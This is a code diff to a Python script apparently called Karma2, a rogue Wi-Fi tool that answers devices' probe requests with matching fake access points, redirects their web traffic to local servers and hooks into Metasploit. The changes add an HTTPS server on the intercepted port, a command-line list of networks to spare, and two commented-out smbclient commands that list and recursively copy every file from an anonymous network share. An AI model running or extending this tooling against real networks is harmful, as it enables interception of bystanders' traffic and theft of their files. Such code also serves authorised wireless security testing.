@@ -1,5 +1,6 @@
 #!/usr/bin/env python
-
+#smbclient //192.168.211.113/ p -L 192.168.211.113
+#smbclient '\\192.168.211.113\tmp' -N -c 'prompt OFF;recurse ON;cd '/';lcd '/tmp/testsmb';mget *'
 import os
 from threading import Lock,Thread
 import time,random,re,tempfile
@@ -13,6 +14,7 @@ import urllib2
 import json
 import base64
 import signal
+import ssl
 
 DEFAULT = '\033[49m\033[39m'
 RED = '\033[91m'
@@ -59,6 +61,7 @@ def parse_args():
     parser.add_argument("-x", "--management", help="deploy a management AP on this interface")
     parser.add_argument("-d", "--debug", action='store_true', help="debug mode")
     parser.add_argument("-u", "--uri", help="wifiScanMap sync uri")
+    parser.add_argument("-b", "--forbidden", help="list of forBidden essid")
     return parser.parse_args()
 
 def log(message):
@@ -66,22 +69,36 @@ def log(message):
 
 class Karma2:
 
-  FORBIDDEN_APS = ('ottersHQ','forYourOttersOnly')
-
   class Webserver(Thread):
     daemon=True
     def __init__(self, app, port = 80):
       Thread.__init__(self)
+      self.PRE="HTTP"
       self.app = app
       self.port = port
 
     def run(self):
-      set_title('webserver')
-      log( "run server" )
+      set_title('webserver %s'%self.port)
+      print "run server on", self.port
       server_class=Karma2.HTTPServer
       handler_class=Karma2.HTTPRequestHandler
       server_address = ('', self.port)
       httpd = server_class(server_address, self.app, handler_class)
+      httpd.serve_forever()
+
+  class SSLWebserver(Webserver):
+    def __init__(self, app, port = 443):
+      self.PRE="HTTPS"
+      Karma2.Webserver.__init__(self, app, port)
+
+    def run(self):
+      set_title('webserver %s'%self.port)
+      print "run server on", self.port
+      server_class=Karma2.HTTPServer
+      handler_class=Karma2.HTTPRequestHandler
+      server_address = ('', self.port)
+      httpd = server_class(server_address, self.app, handler_class)
+      httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='./key.pem', certfile='./cert.pem', server_side=True)
       httpd.serve_forever()
 
   class HTTPServer(BaseHTTPServer.HTTPServer):
@@ -569,7 +586,7 @@ class Karma2:
           iface, = m.groups()
           return iface,p
 
-  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False, debug = False, uri = None):
+  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False, debug = False, uri = None, forbidden = ()):
     self.ifmon = ifmon
     self.ifgw = ifgw
     self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
@@ -582,11 +599,11 @@ class Karma2:
     self.debug = debug
     self.uri = uri
     self.locals_interfaces = self.getWirelessInterfacesList()
-
+    self.forbidden_aps = forbidden
     if not offline:
       self.setup_nat(ifgw)
     
-    self.redirections = {80:8080, 443:8080}
+    self.redirections = {80:8080, 443:8081}
     if redirections is not None:
       r = redirections.split(',')
       for re in r:
@@ -675,7 +692,7 @@ class Karma2:
 
   def process_probe(self, essid, bssid = None):
     if (not essid in self.aps.keys()
-            and not essid in self.FORBIDDEN_APS):
+            and not essid in self.forbidden_aps):
             self.create_ap(essid, bssid)
   
   def getWirelessInterfacesList(self):
@@ -726,9 +743,12 @@ class Karma2:
       
       sniff(prn=_filter,store=0)
 
-  def start_webserver(self, km, port):
+  def start_webserver(self, km, port, ssl_port):
     ws = Karma2.Webserver(km, port)
     ws.start()
+    wss = Karma2.SSLWebserver(km, ssl_port)
+    wss.start()
+
 
   def status(self, signum, stack):
     print "==========="
@@ -776,12 +796,15 @@ if __name__ == '__main__':
   try:
     args.hostapds = args.hostapds.split(',')
 
-    km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan, args.debug, args.uri)
+    forbidden = ()
+    if args.forbidden is not None:
+     forbidden = args.forbidden.split(',')
+    km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan, args.debug, args.uri, forbidden)
     signal.signal(signal.SIGUSR1, km.status)
     signal.signal(signal.SIGUSR2, km.status)
     
     if args.offline:
-      km.start_webserver(km, km.redirections[80])
+      km.start_webserver(km, km.redirections[80], km.redirections[443])
 
     if args.name is not None:
       # 24h timeout
